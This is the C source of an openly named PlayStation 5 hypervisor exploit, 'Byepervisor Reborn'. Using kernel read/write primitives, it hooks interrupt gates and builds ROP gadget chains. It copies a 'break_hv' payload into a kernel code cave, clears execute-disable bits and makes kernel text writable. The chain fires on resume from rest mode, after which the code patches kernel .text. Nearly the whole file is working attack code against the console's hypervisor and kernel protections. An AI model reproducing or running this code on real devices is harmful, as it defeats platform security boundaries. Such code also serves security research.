#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/mman.h>

#include <ps5/kernel.h>
#include <sys/syscall.h>

#include "kdlsym.h"
#include "khook.h"
#include "util.h"
#include "paging.h"
#include "resume_hook_1160.h"

#include "break_hv_payload/break_hv.h"

#define STATE_ARMED               0x4B484F4F4B454401ULL // 'KHOOKED.'
#define COOKIE_VAL                0xCAFE133741414141ULL
#define HOOK_CORE                 0
#define HOOK_IST                  6
#define CAVE_STATE_OFF            0x600
#define CAVE_SAVE_OFF             0x620
#define CAVE_PREP_OFF             0x680
#define TSS_STRIDE                0x68
#define STARTUP_MP_PAYLOAD_PAGE   0x3FFFF000

#define PREP_MARK                 0x315045525054584BULL /* "KXTPREP1" */
#define MARK_ENTERED              0x454E544552454431ULL /* "ENTERED1" */
#define MARK_DONE                 0x444F4E452D415031ULL /* "DONE-AP1" */
#define MODE_STRIKE               0x31454B4952545356ULL /* "VSTRIKE1" */

#define HV_LOADER_PA_REGULAR      0x062800000
#define HV_LOADER_PA_PRO          0x8e0800000
#define HV_REGION_PA_PRO          (HV_LOADER_PA_PRO - 0x800000ULL)
#define HV_SCAN_LO_REGULAR        (HV_LOADER_PA_REGULAR + 0x200000ULL)
#define HV_SCAN_HI_REGULAR        (HV_LOADER_PA_REGULAR + 0x1000000ULL)
#define HV_SCAN_LO_PRO            (HV_REGION_PA_PRO + 0xa00000ULL)
#define HV_SCAN_HI_PRO            (HV_REGION_PA_PRO + 0x1800000ULL)

uint64_t g_hv_base_pa;

static int install_test_hook(int core_id, uint64_t cave)
{
  khook_t    hook;
  kh_chain_t chain;
  uint8_t    chain_buf[0x400];
  int        ret;

  printf("[+] install_test_hook addr = %p\n", &install_test_hook);

  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;

  hook.tss_stride      = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.oneshot   = 1;

  // kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xB);    // 8b4008             mov     eax, dword [rax+0x8]
  // kh_set_resume_rax(&hook, ktext(0x12F61C6));
  // kh_set_resume_skip(&hook, 3);
  // kh_set_resume_rip(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xB + 3); // skip ^^^

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);       // 48898708040000     mov     qword [rdi+0x408], rax
  kh_set_resume_rax(&hook, 0x12345678);
  //kh_set_resume_skip(&hook, 7);
  //kh_set_resume_rip(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE + 7); // skip ^^^

  uint64_t oracle = kh_user_data_addr(&hook);
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  ret = kh_install(&hook, &chain);
  if (ret) return ret;

  kh_trigger(&hook);

  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
  return 0;
}

static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
{
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x800];
  uint64_t set_rsi;
  uint64_t oracle;
  int ret;

  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;

  hook.tss_stride      = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.oneshot   = 1;

  set_rsi = kdldmap(STARTUP_MP_PAYLOAD_PAGE); // our payload
  // set_rsi = ktext(0x269FB8); // original vector (13.60)

  printf("[+] install_resume_hook: setting hook target = 0x%lx (base: 0x%lx), set rsi=0x%lx\n", kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL), ktext(0), set_rsi);
  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  kh_set_resume_rsi(&hook, set_rsi);
  kh_set_resume_rdx(&hook, cr3);

  oracle = kh_user_data_addr(&hook);
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
  kh_chain_q(&chain, cr3);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(&chain, oracle + 0x08);
  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);

  kh_chain_memcpy(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE), kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, 0xF00);

  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF00), kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF08), kdldmap(0));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF10), oracle);

  // carveout addr
  if (g_hv_base_pa == HV_LOADER_PA_PRO)
    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa - 0x800000);
  else
    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa);

  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20), g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), g_hv_base_pa + rawoff(HV_SYM_PCPUS));
  /* The AP payload uses this slot only to select the isolated 11.60 path. */
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF38), 0);

  ret = kh_install(&hook, &chain);
  if (ret) return ret;

  kh_trigger(&hook);

  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
  return 0;
}

static void uninstall_hook(int core_id, uint64_t cave)
{
  khook_t hook;
  kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.saved_gate_lo = kread64(cave + CAVE_SAVE_OFF + 0x00);
  hook.saved_gate_hi = kread64(cave + CAVE_SAVE_OFF + 0x08);
  hook.saved_ist     = kread64(cave + CAVE_SAVE_OFF + 0x10);
  hook.installed     = 1;
  kh_disarm(&hook);
  kh_restore(&hook);
  kwrite64(cave + CAVE_STATE_OFF, 0);
}

static int make_payload_page_executable(uint64_t kernel_pmap)
{
  uint64_t addr = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t entry_addr, entry;

  entry_addr = find_pml4e(kernel_pmap, addr, &entry);
  if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
    return -1;
  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
  kwrite64(entry_addr, entry);

  entry_addr = find_pdpe(kernel_pmap, addr, &entry);
  if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
    return -2;
  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
  kwrite64(entry_addr, entry);
  if (PDE_FIELD(entry, PS) == 1)
    return 0;

  entry_addr = find_pde(kernel_pmap, addr, &entry);
  if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
    return -3;
  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
  kwrite64(entry_addr, entry);
  if (PDE_FIELD(entry, PS) == 1)
    return 0;

  entry_addr = find_pte(kernel_pmap, addr, &entry);
  if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
    return -4;
  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
  kwrite64(entry_addr, entry);
  return 0;
}

static uint64_t enable_kernel_text_access_1160(uint64_t kernel_pmap)
{
  uint64_t changed = 0;

  for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE;
       addr += 0x1000) {
    uint64_t entry_addr, entry, updated;

    entry_addr = find_pde(kernel_pmap, addr, &entry);
    if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
      continue;
    updated = entry;
    CLEAR_PDE_BIT(updated, XOTEXT);
    SET_PDE_BIT(updated, RW);
    if (updated != entry) {
      kwrite64(entry_addr, updated);
      changed++;
    }
    if (PDE_FIELD(entry, PS) == 1)
      continue;

    entry_addr = find_pte(kernel_pmap, addr, &entry);
    if (entry_addr == 0xFFFFFFFFFFFFFFFFull)
      continue;
    updated = entry;
    CLEAR_PDE_BIT(updated, XOTEXT);
    SET_PDE_BIT(updated, RW);
    if (updated != entry) {
      kwrite64(entry_addr, updated);
      changed++;
    }
  }
  return changed;
}

#define PAGE_ADDR_MASK 0x000ffffffffff000ULL
#define PAGE_PAT_4K    (1ULL << 7)
#define PAGE_PAT_BIG   (1ULL << 12)

static int safe_page_entry(uint64_t entry)
{
  return PDE_FIELD(entry, PRESENT) &&
         !PDE_FIELD(entry, WRITE_THROUGH) &&
         !PDE_FIELD(entry, CACHE_DISABLE) &&
         !PDE_FIELD(entry, XOTEXT);
}

static int resolve_kernel_pa(uint64_t kernel_pmap, uint64_t va,
                             uint64_t *pa_out)
{
  uint64_t table, entry;

  table = kread64(kernel_pmap + KERNEL_OFFSET_PMAP_PM_PML4);
  if ((table >> 47) != 0x1ffffULL)
    return -1;

  entry = kread64(table + ((va >> 39) & 0x1ffULL) * 8);
  if (!safe_page_entry(entry))
    return -2;
  table = kdldmap(entry & PAGE_ADDR_MASK);

  entry = kread64(table + ((va >> 30) & 0x1ffULL) * 8);
  if (!safe_page_entry(entry))
    return -3;
  if (PDE_FIELD(entry, PS)) {
    if (entry & PAGE_PAT_BIG)
      return -3;
    *pa_out = (entry & 0x000fffffc0000000ULL) |
              (va & 0x3fffffffULL);
    return 0;
  }
  table = kdldmap(entry & PAGE_ADDR_MASK);

  entry = kread64(table + ((va >> 21) & 0x1ffULL) * 8);
  if (!safe_page_entry(entry))
    return -4;
  if (PDE_FIELD(entry, PS)) {
    if (entry & PAGE_PAT_BIG)
      return -4;
    *pa_out = (entry & 0x000fffffffe00000ULL) |
              (va & 0x1fffffULL);
    return 0;
  }
  table = kdldmap(entry & PAGE_ADDR_MASK);

  entry = kread64(table + ((va >> 12) & 0x1ffULL) * 8);
  if (!safe_page_entry(entry) || (entry & PAGE_PAT_4K))
    return -5;
  *pa_out = (entry & PAGE_ADDR_MASK) | (va & 0xfffULL);
  return 0;
}

static int preflight_scan_range(uint64_t kernel_pmap, uint64_t scan_lo,
                                uint64_t scan_hi)
{
  uint64_t resolved;

  if (scan_lo >= scan_hi || (scan_lo & 0xfffULL) ||
      (scan_hi & 0xfffULL))
    return -1;
  for (uint64_t pa = scan_lo; pa < scan_hi; pa += 0x1000ULL) {
    uint64_t va = kdldmap(pa);
    int r = resolve_kernel_pa(kernel_pmap, va, &resolved);
    if (r || resolved != pa)
      return r ? r : -6;
    (void)kread64(va);
  }
  return 0;
}

static int result_1160_done(uint64_t cave)
{
  uint64_t oracle = cave + KH_OFF_USER;
  return kread64(oracle + 0x00) == MARK_ENTERED &&
         kread64(oracle + 0x08) == MODE_STRIKE &&
         kread64(oracle + 0x18) == MARK_DONE;
}

static int result_1160_success(uint64_t cave)
{
  uint64_t ext = cave + RESUME_1160_RESULT_OFF;
  return kread64(cave + CAVE_PREP_OFF) == PREP_MARK &&
         result_1160_done(cave) &&
         kread64(ext + 0x00) == 0 &&
         kread64(ext + 0x10) == 1 &&
         kread64(ext + 0x18) == 16 &&
         kread64(ext + 0x40) == 16 &&
         kread64(ext + 0x48) == 16 &&
         kread64(ext + 0xd0) == 0 &&
         kread64(ext + 0xd8) == 0 &&
         kread64(ext + 0xe0) == kread64(ext + 0xe8);
}

static void print_result_1160(uint64_t cave)
{
  uint64_t oracle = cave + KH_OFF_USER;
  uint64_t ext = cave + RESUME_1160_RESULT_OFF;

  printf("[11.60] chain=%016lx entered=%016lx mode=%016lx done=%016lx\n",
         kread64(oracle + 0x20), kread64(oracle + 0x00),
         kread64(oracle + 0x08), kread64(oracle + 0x18));
  printf("[11.60] error=%lu self=%016lx self_count=%lu targets=%lu\n",
         kread64(ext + 0x00), kread64(ext + 0x08),
         kread64(ext + 0x10), kread64(ext + 0x18));
  printf("[11.60] written=%lu verified=%lu\n",
         kread64(ext + 0x40), kread64(ext + 0x48));
  printf("[11.60] rollback written=%lu verified=%lu\n",
         kread64(ext + 0xd0), kread64(ext + 0xd8));
}

static int prove_result_1160(uint64_t cave)
{
  uint64_t first;
  uint8_t *bytes;

  if (!result_1160_success(cave)) {
    notifyf("[ERROR] Byepervisor Reborn 11.60\nResume strike was not verified\nCold reboot required");
    return 7;
  }

  first = kread64(ktext(0));
  bytes = (uint8_t *)&first;
  printf("[11.60] kernel text first qword=%016lx\n", first);
  kHexDump(ktext(0), 0x60);
  notifyf("Byepervisor Reborn 11.60 succeeded\nKernel .text: %02x %02x %02x %02x %02x %02x %02x %02x",
          bytes[0], bytes[1], bytes[2], bytes[3],
          bytes[4], bytes[5], bytes[6], bytes[7]);
  return 0;
}

static int run_1160(uint64_t cave)
{
  uint64_t oracle = cave + KH_OFF_USER;
  uint64_t ext = cave + RESUME_1160_RESULT_OFF;
  uint64_t kernel_pmap, kernel_pm_cr3, changed;
  uint64_t scan_lo, scan_hi;
  uint64_t zeroes[30] = {0};
  int r;

  if (g_hv_base_pa == HV_LOADER_PA_PRO) {
    scan_lo = HV_SCAN_LO_PRO;
    scan_hi = HV_SCAN_HI_PRO;
  } else {
    scan_lo = HV_SCAN_LO_REGULAR;
    scan_hi = HV_SCAN_HI_REGULAR;
  }

  if (pin_to_core(HOOK_CORE) != 0 || get_cpu_core() != 15) {
    printf("[11.60] failed to pin scheduler CPU 15 / TSS index 0\n");
    notifyf("[ERROR] Byepervisor Reborn 11.60\nCore pin failed");
    return 2;
  }

  if (resume_hook_1160_is_armed(cave)) {
    if (result_1160_done(cave)) {
      print_result_1160(cave);
      if (resume_hook_1160_cleanup(cave)) {
        notifyf("[ERROR] Byepervisor Reborn 11.60\nHook cleanup failed");
        return 6;
      }
      printf("[11.60] hardened hook restored\n");
      return prove_result_1160(cave);
    }
    printf("[11.60] resume hook is already armed\n");
    notifyf("Byepervisor Reborn 11.60\nEnter rest mode and resume");
    goto wait_for_resume;
  }

  if (result_1160_done(cave)) {
    print_result_1160(cave);
    if (result_1160_success(cave))
      return prove_result_1160(cave);
    notifyf("[ERROR] Byepervisor Reborn 11.60\nPrevious resume strike failed");
    return 8;
  }

  kwrite(oracle, zeroes, 8 * sizeof(uint64_t));
  kwrite(ext, zeroes, sizeof(zeroes));
  kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
  kernel_pm_cr3 = kread64(kernel_pmap + 0x28);
  r = preflight_scan_range(kernel_pmap, scan_lo, scan_hi);
  if (r) {
    printf("[11.60] VMCB scan-range preflight failed: %d\n", r);
    notifyf("[ERROR] Byepervisor Reborn 11.60\nHV mapping preflight failed (%d)", r);
    return 3;
  }
  printf("[11.60] VMCB scan range %016lx..%016lx preflight passed\n",
         scan_lo, scan_hi);

  r = make_payload_page_executable(kernel_pmap);
  if (r) {
    printf("[11.60] payload page walk failed: %d\n", r);
    notifyf("[ERROR] Byepervisor Reborn 11.60\nPayload page walk failed (%d)", r);
    return 3;
  }

  changed = enable_kernel_text_access_1160(kernel_pmap);
  kwrite64(cave + CAVE_PREP_OFF, PREP_MARK);
  printf("[11.60] prepared %lu kernel page-table entries\n", changed);

  r = resume_hook_1160_arm(cave, kernel_pm_cr3, scan_lo, scan_hi,
                           break_hv, break_hv_len);
  if (r) {
    printf("[11.60] hook installation failed: %d\n", r);
    if (resume_hook_1160_is_armed(cave) &&
        resume_hook_1160_cleanup(cave)) {
      notifyf("[ERROR] Byepervisor Reborn 11.60\nHook recovery failed\nCold reboot required");
      return 6;
    }
    notifyf("[ERROR] Byepervisor Reborn 11.60\nHook install failed (%d)", r);
    return 4;
  }

  printf("[11.60] hook armed; enter rest mode and resume\n");
  notifyf("Byepervisor Reborn 11.60 armed\nEnter rest mode and resume");

wait_for_resume:
  for (;;) {
    pin_to_core(HOOK_CORE);
    if (result_1160_done(cave)) {
      print_result_1160(cave);
      if (resume_hook_1160_cleanup(cave)) {
        notifyf("[ERROR] Byepervisor Reborn 11.60\nHook cleanup failed");
        return 6;
      }
      printf("[11.60] hardened hook restored\n");
      return prove_result_1160(cave);
    }
    sceKernelSleep(2);
  }
}

int main(void)
{
  uint64_t test_val;
  uint8_t *test_val_bytes;

  uint32_t fw;
  uint64_t cave;
  uint64_t oracle;
  uint64_t kernel_pmap;
  uint64_t kernel_pm_cr3;
  uint64_t pml4e_addr;
  uint64_t pdpe_addr;
  uint64_t pte_addr;
  uint64_t pde_addr;
  uint64_t pml4e;
  uint64_t pdpe;
  uint64_t pde;
  uint64_t pte;
  uint64_t o;

  printf("[+] Byepervisor reborn v1\n");

  // Do a quick firmware version detect, if we don't have offsets for it, goodbye!
  fw = kernel_get_fw_version();
  printf("[+] Detected firmware: %x.%x\n", (fw & 0xFF000000) >> 0x18, (fw & 0x00FF0000) >> 0x10);

  if (kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) == 0) {
    printf("[!] Undetected firmware, exiting!\n");
    notifyf("[ERROR] Byepervisor Reborn\nFirmware is not supported :(\n");
    return 1;
  }
  if ((fw & 0xffff0000U) == 0x11600000U && fw != RESUME_1160_FW_RAW) {
    printf("[!] Unsupported 11.60 kernel build: 0x%x\n", fw);
    notifyf("[ERROR] Byepervisor Reborn 11.60\nKernel build is not supported");
    return 1;
  }

  // The hypervisor loader's base physical address changes depending on if its a regular or a pro unit
  int soc_id = sceKernelGetMainSocId();
  if (soc_id == 0x840fd0) {
    g_hv_base_pa = HV_LOADER_PA_PRO;
    printf("[+] Pro model detected, HV loader PA = 0x%lx\n", g_hv_base_pa);
    notifyf("Byepervisor Reborn\nDetected pro model (0x%x)\n", soc_id);
  } else {
    g_hv_base_pa = HV_LOADER_PA_REGULAR;
    printf("[+] Regular model detected, HV loader PA = 0x%lx\n", g_hv_base_pa);
    notifyf("Byepervisor Reborn\nDetected regular model (0x%x)\n", soc_id);
  }

  // We need system ucred to pin to core 0
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);

  cave   = kdlsym(KERNEL_SYM_DATA_CAVE);
  oracle = cave + KH_OFF_USER;

  if (fw == RESUME_1160_FW_RAW) {
    return run_1160(cave);
  }

  pin_to_core(HOOK_CORE);

  // This is so we can send the same payload after resume to experiment with post-HV hax (or not if we want to debug the resume payload)
#define DEBUG_MP_STARTUP_PAYLOAD 0
#if DEBUG_MP_STARTUP_PAYLOAD == 0
  if (kread64(oracle) != 0) {
    printf("Hypervisor is already compromised\n");
    printf("Here's a dump of kernel .text base (xotext defeated)!\n");
    kHexDump(ktext(0), 0x60);

    printf("Here's a dump of some HV strings (hvcore+0x19830)!\n");
    kHexDump(kdldmap(g_hv_base_pa + 0x72830), 0x60);

    kwrite64(ktext(8), 0x41414141);

    printf("Edited kernel .text\n");
    kHexDump(ktext(0), 0x60);

    test_val = kread64(ktext(0));
    test_val_bytes = (uint8_t *) &test_val;
    notifyf("Byepervisor - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);

    return 0;
  }
#endif

#if defined(KHOOK_TEST)
  int ret;

  ret = install_test_hook(HOOK_CORE, cave);
  printf("installed test khook = %d\n", ret);

  printf("1\n");
  sceKernelSleep(1);

  kwrite64(oracle, 0);
  printf("2\n");
  sceKernelSleep(1);

  pin_to_core(HOOK_CORE);
  printf("core = %d\n", get_cpu_core());

  ret = syscall(SYS_getuid);

  o = kread64(oracle);
  printf("test khook oracle=0x%lx (ret = 0x%x)\n", o, ret);
  kwrite64(oracle, 0);
  sceKernelSleep(1);

  ret = syscall(SYS_getuid);

  o = kread64(oracle);
  printf("test khook oracle=0x%lx (ret = 0x%x)\n", o, ret);

  sceKernelSleep(1);

  uninstall_hook(HOOK_CORE, cave);
  notifyf("uninstalled test khook\n");
  return 0;

#else // !KHOOK_TEST

  // Copy our payload that runs from startup_mp into kernel cave
  kwrite(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, break_hv, break_hv_len);

  // Make the physical region executable in guest page tables
  kernel_pmap   = kdlsym(KERNEL_SYM_PMAP_STORE);
  kernel_pm_cr3 = kread64(kernel_pmap + 0x28);

  pml4e_addr = find_pml4e(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pml4e);
  CLEAR_PDE_BIT(pml4e, EXECUTE_DISABLE);
  kwrite64(pml4e_addr, pml4e);

  pdpe_addr = find_pdpe(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pdpe);
  CLEAR_PDE_BIT(pdpe, EXECUTE_DISABLE);
  kwrite64(pdpe_addr, pdpe);

  if (PDE_FIELD(pdpe, PS) != 1) {
    pde_addr = find_pde(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pde);
    CLEAR_PDE_BIT(pde, EXECUTE_DISABLE);
    kwrite64(pde_addr, pde);

    if (PDE_FIELD(pde, PS) != 1) {
      pte_addr = find_pte(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pte);
      CLEAR_PDE_BIT(pte, EXECUTE_DISABLE);
      kwrite64(pte_addr, pte);
    }
  }

  // Disable xotext + enable write on kernel .text pages
  printf("[+] Disabling xotext + enabling write...\n");
  for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE; addr += 0x1000) {
    pde_addr = find_pde(kernel_pmap, addr, &pde);
    if (pde_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pde, XOTEXT);
      SET_PDE_BIT(pde, RW);
      kwrite64(pde_addr, pde);
    }

    pte_addr = find_pte(kernel_pmap, addr, &pte);
    if (pte_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pte, XOTEXT);
      SET_PDE_BIT(pte, RW);
      kwrite64(pte_addr, pte);
    }
  }

  // Install hook on startup_mp hypercall
  printf("[+] Installing hook...\n");
  if (kread64(cave + CAVE_STATE_OFF) != STATE_ARMED) {
    int r = install_resume_hook(HOOK_CORE, cave, kernel_pm_cr3);
    if (r) {
      printf("[!] Failed to install hook (likely too large)\n");
      notifyf("[ERROR] Byepervisor Reborn\nHook install failed :(");
      return r;
    }

    printf("[+] Hook installed, enter sleep and resume!\n");
    notifyf("Byepervisor Reborn\nEnter sleep and resume!\n");
  } else {
    printf("khook: hook already ARMED (state survived)\n");
  }

  // Poll for resume and hook trigger
  for (;;) {
    pin_to_core(HOOK_CORE);

    o = kread64(oracle);
    if (o != 0) {
      notifyf("Byepervisor Reborn\nWelcome back, hypervisor is defeated!\nCookie? 0x%lx", o);
      
      printf("[+] Uninstalling hook\n");
      uninstall_hook(HOOK_CORE, cave);

      test_val = kread64(ktext(0));
      test_val_bytes = (uint8_t *) &test_val;
      notifyf("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);

      // TODO: Patch kernel and all that fun stuff, we don't feel like doing this so someone else can do it :)

      return 0;
    }

    sceKernelSleep(5);
  }
  return 0;
#endif
}
